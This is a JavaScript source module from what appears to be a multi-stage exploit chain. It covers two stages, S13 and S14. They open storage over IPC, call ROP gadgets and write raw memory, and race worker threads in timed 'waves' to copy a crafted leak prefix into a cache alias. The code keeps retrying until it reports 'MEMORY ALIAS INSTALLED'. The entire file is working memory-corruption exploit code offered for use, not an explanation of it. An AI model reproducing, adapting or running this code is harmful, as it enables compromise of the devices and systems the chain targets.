import coreRuntime, {waitMs} from "../runtime.mjs";
import {verboseLog, isVerboseLogging} from "../logger.mjs";

const {
    GADGET_MEMSET,
    allocPage,
    call_rop,
    closeReservationGroup,
    executeWave,
    frameArgSlot,
    ipcStorageRead,
    openContentStorage,
    openReservationGroup,
    prepareReleaseRequest,
    readAllocationCounters,
    resetWaveState,
    roleSendCode,
    write32,
    write64,
    writeDirtyData
} = coreRuntime;

// ----- Candidate storage and cache alias (S13 and S14) -----

/**
 * S13: open the post-canary candidate storage and read the control bytes it has
 * to match. Nothing has been copied yet, so a failure here leaves no cache entry
 * for cleanup to retire.
 */
export async function preparePostCanaryCandidate({
    config,
    helpers,
    canaryQualified,
    pktBuf,
    rootSession,
    storageHandle,
    workerStateSafe,
    usePreReservation = false
}) {
    let candidateHandle = 0;
    let primeHex = "";
    let failureReason = null;
    let controlHex = "";
    let aliasControlHex = "";
    let allocCost = null;
    let preGroup = null;

    if (canaryQualified && workerStateSafe) {
        // Baseline read: one full cache block from offset 0 on the original storage.
        const controlBuf = allocPage(config.CONTROL_SIZE + 0x2000);
        call_rop(GADGET_MEMSET, controlBuf, 0xA5n, BigInt(config.CONTROL_SIZE));
        const controlRead = ipcStorageRead(storageHandle, 0, config.CONTROL_SIZE, controlBuf);

        if (controlRead.error === 0) {
            controlHex = helpers.readHexBytes(controlBuf, 16);
        }

        // Compare the alias target with the baseline on the original storage.
        const aliasBuf = allocPage(0x1000);
        call_rop(GADGET_MEMSET, aliasBuf, 0xA5n, 16n);
        const aliasRead = ipcStorageRead(storageHandle, config.ALIAS_OFFSET, 16, aliasBuf);

        if (aliasRead.error === 0) {
            aliasControlHex = helpers.readHexBytes(aliasBuf, 16);
        }

        const offsetsDistinct = controlHex && aliasControlHex && controlHex !== aliasControlHex;

        if (!offsetsDistinct) {
            if (!controlHex || !aliasControlHex) {
                failureReason = "baseline-control-read-failed";
            } else {
                failureReason = "baseline-offsets-not-distinct";
            }

            canaryQualified = false;
        }
    }

    if (usePreReservation && canaryQualified && workerStateSafe) {
        preGroup = openReservationGroup(rootSession, pktBuf, 59);

        if (!preGroup.ok) {
            failureReason = "pre-reservation-failed";
            canaryQualified = false;
            preGroup = null;
        }
    }

    if (canaryQualified && workerStateSafe) {
        const countersBefore = readAllocationCounters(rootSession, pktBuf);
        let beforeHeap = null;

        if (countersBefore) {
            beforeHeap = countersBefore[5];
        }

        candidateHandle = openContentStorage(rootSession);

        if (!candidateHandle) {
            failureReason = "candidate-storage-open-failed";
        } else {
            const primeBuf = allocPage(0x1000);
            call_rop(GADGET_MEMSET, primeBuf, 0xA5n, 16n);
            const primeRead = ipcStorageRead(candidateHandle, 0, 16, primeBuf);

            if (primeRead.error === 0) {
                primeHex = helpers.readHexBytes(primeBuf, 16);
            }

            const primeMatchesControl = primeHex && primeHex === controlHex;

            if (!primeHex) {
                failureReason = "candidate-prime-read-failed";
            } else if (!primeMatchesControl) {
                failureReason = "candidate-prime-mismatch";
            }

            const countersAfter = readAllocationCounters(rootSession, pktBuf);
            let afterHeap = null;

            if (countersAfter) {
                afterHeap = countersAfter[5];
            }

            if (beforeHeap !== null && afterHeap !== null) {
                allocCost = beforeHeap - afterHeap;
            }
        }

        if (!candidateHandle) {
            if (preGroup) {
                closeReservationGroup(preGroup, true, pktBuf);
            }

            preGroup = null;
        } else if (preGroup) {
            if (!Number.isFinite(allocCost) || allocCost < 0) {
                failureReason = failureReason ||
                    "pre-reservation-accounting-unavailable";
                closeReservationGroup(preGroup, true, pktBuf);
                preGroup = null;
            } else {
                preGroup.before[5] -= allocCost;
                preGroup.held[5] -= allocCost;
            }
        }
    }

    if (!workerStateSafe) {
        failureReason = "worker-state-unsafe";
    } else if (!failureReason && !canaryQualified) {
        failureReason = "canary-not-qualified";
    } else if (!failureReason && !candidateHandle) {
        failureReason = "candidate-storage-open-failed";
    } else if (!failureReason && !primeHex) {
        failureReason = "candidate-prime-read-failed";
    }

    if (failureReason && preGroup) {
        closeReservationGroup(preGroup, true, pktBuf);
        preGroup = null;
    }

    return {ok: true, canaryQualified, candidateHandle, primeHex,
        aliasControlHex, preGroup, failureReason};
}

/**
 * S14: copy the candidate into the cache alias, one nul-write step at a time. A
 * step is accepted when a single wave stays inside its window, holds enough of
 * the field in cache, and changes no path it should not.
 *
 * `copy` is the address bag the caller already built. It carries the packets,
 * the wave layout and the analysis subset, so this step never needs a second bag.
 * `canaryState` is what the canary stage left behind; this step extends it
 * instead of replacing it.
 */
export async function installCacheAlias({
    config,
    helpers,
    copy,
    canaryState,
    canaryQualified,
    candidateHandle,
    preGroup = null,
    primeHex,
    renamePathBuffers = null,
    reportProgress = null,
    shouldStop = null
}) {
    const {
        REQ,
        analysis,
        dirtyFilePath,
        dirtyWriteBuf,
        dirtyWritePkt,
        fragmentBufs,
        gates,
        pinPkt,
        pktBuf,
        rawScheduling,
        rootSession,
        savedHandle,
        sendIndices,
        triggerBuf,
        triggerHandle,
        waveData,
        waveExtra,
        workerResources
    } = copy;

    let workerStateSafe = canaryState.workerStateSafe;
    let wavesJoined = canaryState.wavesJoined;
    let wavesStarted = canaryState.wavesStarted;
    let candidateCacheNeedsRetirement = false;
    let stoppedByUser = Boolean(shouldStop?.());

    let aliasInstalled = false;
    let copyWavesTotal = 0;
    let copyStepsCompleted = 0;
    let copyFailureReason = null;
    const copyStepFailures = [];
    const copyFailureCounts = Object.create(null);

    const noteCopyFailure = reason => {
        copyFailureCounts[reason] = (copyFailureCounts[reason] || 0) + 1;
    };

    if (stoppedByUser) {
        copyFailureReason = "stopped-by-user";
    } else if (!canaryQualified) {
        copyFailureReason = "canary-not-qualified";
    } else if (!workerStateSafe) {
        copyFailureReason = "worker-state-unsafe";
    } else if (!candidateHandle) {
        copyFailureReason = "candidate-storage-unavailable";
    } else if (!primeHex) {
        copyFailureReason = "candidate-prime-read-unavailable";
    }

    if (hasCacheAliasPrerequisites(canaryQualified, workerStateSafe, candidateHandle, primeHex,
                                   stoppedByUser)) {

        /*
         * The 18-byte leak prefix is aliasOffset as 8 bytes little-endian, then
         * eight 0x41 bytes, the dirty flag, and the terminating NUL.
         */
        const leakPrefix = config.CACHE_ALIAS_PREFIX.slice();
        const steps = helpers.nulWrites(leakPrefix);

        if (steps.length !== 7) {
            copyFailureReason = "invalid-copy-plan";
            noteCopyFailure("invalid-copy-plan");
        } else {
            let allStepsOk = true;

            /*
             * The first field copy can dirty the cache entry even when a later
             * timing gate rejects that wave, so cleanup has to retire it.
             */
            candidateCacheNeedsRetirement = true;

            for (let stepIdx = 0; stepIdx < steps.length &&
                !stoppedByUser && !shouldStop?.(); stepIdx++) {
                const step = steps[stepIdx];
                let stepConfirmed = false;
                let stepAttempts = 0;
                let stepWindowFail = 0;
                let stepPreLow = 0;
                let stepPathMiss = 0;
                const stepGateFailures = Object.create(null);
                const stepShapeMissing = Object.create(null);
                const stepPathReplyFailures = Object.create(null);
                const stepMarginRange = {min: null, max: null};
                const stepCacheRange = {min: null, max: null};
                let stepHardFailure = null;
                let acceptedResult = null;
                let stepProgressReported = false;
                const stepProgressThreshold = Math.ceil(config.MAX_CACHE_WAVES_PER_STEP / 2);

                for (let waveAttempt = 0;
                    waveAttempt < config.MAX_CACHE_WAVES_PER_STEP &&
                    !stoppedByUser && !shouldStop?.(); waveAttempt++) {
                    stepAttempts++;

                    if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                                        dirtyWriteBuf, dirtyWritePkt)) {
                        stepHardFailure = "dirty-write-failed";
                        noteCopyFailure(stepHardFailure);
                        allStepsOk = false; break;
                    }

                    resetWaveState(waveData.frames, waveData.backups, REQ,
                                   waveData.pktBackups, gates, waveExtra);
                    const payloadSetup = helpers.configurePayload(step.bytes, {config, REQ,
                        fragmentBufs: fragmentBufs, triggerBuf: triggerBuf});

                    if (!payloadSetup.configured) {
                        stepHardFailure = "payload-setup-failed";
                        noteCopyFailure(stepHardFailure);
                        allStepsOk = false; break;
                    }

                    let renameInputBefore = null;

                    if (renamePathBuffers && isVerboseLogging()) {
                        renameInputBefore = helpers.captureRenameInputState(REQ, renamePathBuffers, config.workerRoles);
                    }

                    const group = preGroup || openReservationGroup(rootSession, pktBuf, 59);

                    if (group === preGroup) {
                        preGroup = null;
                    }

                    if (!group.ok) {
                        stepHardFailure = "reservation-failed";
                        noteCopyFailure(stepHardFailure);
                        allStepsOk = false; break;
                    }

                    prepareReleaseRequest(REQ[9], waveData.frames,
                                          sendIndices, group);
                    write64(frameArgSlot(waveData.frames[12].frame,
                                         waveData.frames[12].count, sendIndices[12], 0),
                            BigInt(triggerHandle));
                    write32(pinPkt + 0x18n, 1009n);

                    const wave = executeWave(waveData.frames, rawScheduling,
                                             workerResources, gates, sendIndices,
                                             config.workerRoles);

                    if (wave.started === config.WORKER_COUNT) {
                        wavesStarted++;
                    }

                    if (wave.created < config.WORKER_COUNT ||
                        wave.pinned < config.WORKER_COUNT ||
                        wave.started < config.WORKER_COUNT) {

                        const relCode = roleSendCode(waveData.frames, 9, sendIndices[9]);
                        closeReservationGroup(group,
                                              wave.created < config.WORKER_COUNT ||
                                relCode !== 0, pktBuf);

                        if (wave.created === config.WORKER_COUNT &&
                            wave.pinned < config.WORKER_COUNT) {
                            stepHardFailure = "worker-pinning-failed";
                        } else {
                            stepHardFailure = "worker-start-failed";
                        }

                        noteCopyFailure(stepHardFailure);
                        workerStateSafe = wave.workerStateSafe === true;
                        allStepsOk = false; break;
                    }

                    if (wave.joined < config.WORKER_COUNT) {
                        workerStateSafe = false;
                        stepHardFailure = "worker-join-failed";
                        noteCopyFailure(stepHardFailure);
                        allStepsOk = false; break;
                    }

                    wavesJoined++;

                    const wResult = helpers.analyzeWave("cache-" + stepIdx,
                                                        wave, waveData, group, false,
                                                        {...analysis, renamePathBuffers, renameInputBefore});

                    const releaseWasSent = roleSendCode(waveData.frames, 9,
                                                        sendIndices[9]) === 0;
                    closeReservationGroup(group, !releaseWasSent, pktBuf);

                    copyWavesTotal++;
                    trackRange(stepMarginRange, wResult.marginUsRaw);

                    if (!wResult.window) {
                        recordGateRejections(stepGateFailures, stepShapeMissing, wResult);
                    }

                    recordPathReplyFailures(stepPathReplyFailures,
                                            wResult.pathReplyResults || {});

                    const accepted = wResult.window &&
                        wResult.preReleaseUsed !== null &&
                        wResult.preReleaseUsed >= config.FIELD_MINIMUM_CACHE_HELD &&
                        wResult.changedPaths.length === 0;

                    if (!accepted) {
                        if (!wResult.window) {
                            stepWindowFail++;
                            noteCopyFailure("window-not-qualified");
                        } else if (wResult.preReleaseUsed === null ||
                                 wResult.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD) {
                            stepPreLow++;
                            noteCopyFailure("pre-release-below-minimum");
                            trackRange(stepCacheRange, wResult.preReleaseUsed);
                        } else if (wResult.changedPaths.length > 0) {
                            stepPathMiss++;
                            noteCopyFailure("path-mismatch");
                        }
                    }

                    if (reportProgress && accepted) {
                        if (!isVerboseLogging()) {
                            await reportProgress("Memory alias progress: copy step " +
                                (stepIdx + 1) + "/" + steps.length + " complete after " + stepAttempts + " waves.");
                        }
                    } else if (reportProgress && !stepProgressReported &&
                        stepAttempts >= stepProgressThreshold) {
                        await reportProgress("Memory alias progress: copy step " +
                            (stepIdx + 1) + "/" + steps.length + " is still searching after " + stepAttempts + "/" +
                            config.MAX_CACHE_WAVES_PER_STEP + " waves.");
                        await verboseLog("Memory alias diagnostics: copy step " +
                            (stepIdx + 1) + "/" + steps.length + " after " +
                            stepAttempts + " waves" + formatCopyWaveDiagnostics(stepGateFailures, stepShapeMissing,
                                                                                stepMarginRange, stepCacheRange,
                                                                                stepPathReplyFailures) + " · rejects: window=" + stepWindowFail +
                            ", cache=" + stepPreLow + ", changed-path=" +
                            stepPathMiss + ".");
                        stepProgressReported = true;
                    }

                    if (accepted) {
                        acceptedResult = wResult;
                        candidateCacheNeedsRetirement = true;
                        stepConfirmed = true;
                    }

                    /*
                     * A wave blocks the JS thread for its whole duration. Yielding
                     * between waves lets controller input and the log scroller run.
                     */
                    await waitMs(0);

                    if (shouldStop?.()) {
                        stoppedByUser = true;
                        copyFailureReason = "stopped-by-user";
                    }

                    if (stepConfirmed || stoppedByUser) {
                        break;
                    }
                }

                if (stoppedByUser && !stepConfirmed) {
                    allStepsOk = false;
                    await verboseLog("Memory alias stopped during step " +
                        (stepIdx + 1) + "/" + steps.length + " after " +
                        stepAttempts + " waves.");
                    break;
                }

                if (!allStepsOk || !stepConfirmed) {
                    let stepFailureReason = stepHardFailure || "";

                    if (!stepFailureReason && stepWindowFail) {
                        stepFailureReason = "window-not-qualified";
                    } else if (!stepFailureReason && stepPreLow) {
                        stepFailureReason = "pre-release-below-minimum";
                    } else if (!stepFailureReason && stepPathMiss) {
                        stepFailureReason = "path-mismatch";
                    } else if (!stepFailureReason) {
                        stepFailureReason = "copy-attempts-exhausted";
                    }

                    if (!stepHardFailure) {
                        noteCopyFailure("copy-attempts-exhausted");
                    }

                    copyFailureReason = stepFailureReason;
                    copyStepFailures.push({step: stepIdx + 1,
                        attempts: stepAttempts, windowRejects: stepWindowFail,
                        preReleaseRejects: stepPreLow, pathMismatches: stepPathMiss,
                        reason: stepFailureReason});
                    await verboseLog("Memory alias step " +
                        (stepIdx + 1) + "/" + steps.length + " rejected after " + stepAttempts + " waves: window=" +
                        stepWindowFail + ", cache=" + stepPreLow + ", changed-path=" + stepPathMiss +
                        formatCopyWaveDiagnostics(stepGateFailures,
                                                  stepShapeMissing, stepMarginRange, stepCacheRange,
                                                  stepPathReplyFailures) + ".");
                    allStepsOk = false; break;
                }

                copyStepsCompleted++;
                await verboseLog("Memory alias step " +
                    (stepIdx + 1) + "/" + steps.length + " accepted after " +
                    stepAttempts + " waves" + formatAcceptedCopyWaveDetails(acceptedResult) + ".");

                if (stoppedByUser) {
                    allStepsOk = false;
                    break;
                }
            }

            if (shouldStop?.()) {
                stoppedByUser = true;
                copyFailureReason = "stopped-by-user";
            }

            aliasInstalled = allStepsOk && !stoppedByUser;
        }

    }

    if (preGroup) {
        closeReservationGroup(preGroup, true, pktBuf);
        preGroup = null;
    }

    return {ok: true, aliasInstalled, candidateCacheNeedsRetirement,
        copyStepsCompleted, copyWavesTotal, copyFailureReason,
        copyFailureCounts, copyStepFailures, wavesJoined, wavesStarted,
        workerStateSafe, stoppedByUser};
}

/** Tally the gates and the overlap roles a rejected wave missed. */
function recordGateRejections(gateFailures, shapeMissing, result) {
    let rejectedGates = [];

    if (Array.isArray(result.rejections)) {
        rejectedGates = result.rejections;
    }

    if (!rejectedGates.length) {
        gateFailures["window-unqualified"] =
            (gateFailures["window-unqualified"] || 0) + 1;
    }

    for (let gateIndex = 0; gateIndex < rejectedGates.length; gateIndex++) {
        const gateName = rejectedGates[gateIndex];
        gateFailures[gateName] = (gateFailures[gateName] || 0) + 1;
    }

    if (rejectedGates.indexOf("shape") >= 0) {
        for (let missingIndex = 0;
            missingIndex < (result.shapeMissing || []).length; missingIndex++) {
            const missingRole = result.shapeMissing[missingIndex];
            shapeMissing[missingRole] = (shapeMissing[missingRole] || 0) + 1;
        }
    }
}

/**
 * Tally the path replies that came back as anything other than 0x202. A copy
 * wave may only see "path not found", so every other reply means a path already
 * exists.
 */
function recordPathReplyFailures(pathReplyFailures, pathReplies) {
    const pathRoles = ["filler0", "filler1", "guard0", "guard1"];

    for (let roleIndex = 0; roleIndex < pathRoles.length; roleIndex++) {
        const pathRole = pathRoles[roleIndex];
        const pathCode = pathReplies[pathRole];

        if (pathCode == null) {
            continue;
        }

        const pathRaw = Number(pathCode) >>> 0;
        let pathCanonical;

        if (pathRaw === 0xFFFFFFFF) {
            pathCanonical = pathRaw;
        } else {
            pathCanonical = pathRaw & 0x3FFFFF;
        }

        if (pathCanonical === 0x202) {
            continue;
        }

        const failureKey = pathRole + "/0x" + pathCanonical.toString(16);

        if (!pathReplyFailures[failureKey]) {
            pathReplyFailures[failureKey] = {count: 0, rawExample: pathRaw};
        }

        pathReplyFailures[failureKey].count++;
    }
}

/** Keep the running minimum and maximum of one sample series. */
function trackRange(range, value) {
    if (!Number.isFinite(value)) {
        return;
    }

    if (range.min === null || value < range.min) {
        range.min = value;
    }

    if (range.max === null || value > range.max) {
        range.max = value;
    }
}

function hasCacheAliasPrerequisites(canaryQualified, workerStateSafe, candidateHandle, primeHex,
                                    stoppedByUser) {
    return canaryQualified && workerStateSafe && candidateHandle && primeHex &&
        !stoppedByUser;
}

export function createAliasStatusMessage(alias) {
    if (alias?.aliasInstalled) {
        return "MEMORY ALIAS INSTALLED";
    }

    if (alias?.copyStepsCompleted) {
        return "Memory alias installation is incomplete.";
    }

    return "Memory alias could not be installed.";
}

function formatAcceptedCopyWaveDetails(result) {
    let details = "";

    if (result?.margin != null) {
        details += " · margin=" + result.margin + "/300µs";
    }

    if (result?.preReleaseUsed != null) {
        details += " · cache=0x" + Number(result.preReleaseUsed).toString(16);
    }

    return details;
}

function formatCopyWaveDiagnostics(gateFailures, shapeMissing, marginRange,
                                   cacheRange, pathReplyFailures) {
    const parts = [];
    const gates = Object.keys(gateFailures || {}).sort((a, b) =>
        gateFailures[b] - gateFailures[a]);

    if (gates.length) {
        const shown = gates.slice(0, 5).map(key =>
            key + "=" + gateFailures[key]);

        if (gates.length > shown.length) {
            shown.push("+" + (gates.length - shown.length) + " other gates");
        }

        parts.push("gate rejects: " + shown.join(", "));
    }

    const missing = Object.keys(shapeMissing || {}).sort((a, b) =>
        shapeMissing[b] - shapeMissing[a]);

    if (missing.length) {
        const shown = missing.slice(0, 4).map(role =>
            role + "=" + shapeMissing[role]);

        if (missing.length > shown.length) {
            shown.push("+" + (missing.length - shown.length) + " roles");
        }

        parts.push("overlap missing: " + shown.join(", "));
    }

    if (marginRange.min !== null && marginRange.max !== null) {
        parts.push("margin=" + marginRange.min.toFixed(0) + ".." +
            marginRange.max.toFixed(0) + "µs");
    }

    if (cacheRange.min !== null && cacheRange.max !== null) {
        parts.push("low cache hold=0x" + cacheRange.min.toString(16) + "..0x" + cacheRange.max.toString(16));
    }

    const pathReplies = Object.keys(pathReplyFailures || {}).sort((a, b) =>
        pathReplyFailures[b].count - pathReplyFailures[a].count);

    if (pathReplies.length) {
        const shown = pathReplies.slice(0, 5).map(key => {
            const stats = pathReplyFailures[key];
            let rawExample = "unknown";

            if (stats.rawExample != null) {
                rawExample = "0x" + stats.rawExample.toString(16);
            }

            return key + "=" + stats.count + " (raw " + rawExample + ")";
        });

        if (pathReplies.length > shown.length) {
            shown.push("+" + (pathReplies.length - shown.length) + " other replies");
        }

        parts.push("non-202 path replies: " + shown.join(", "));
    }

    if (!parts.length) {
        return "";
    }

    return " · " + parts.join(" · ");
}
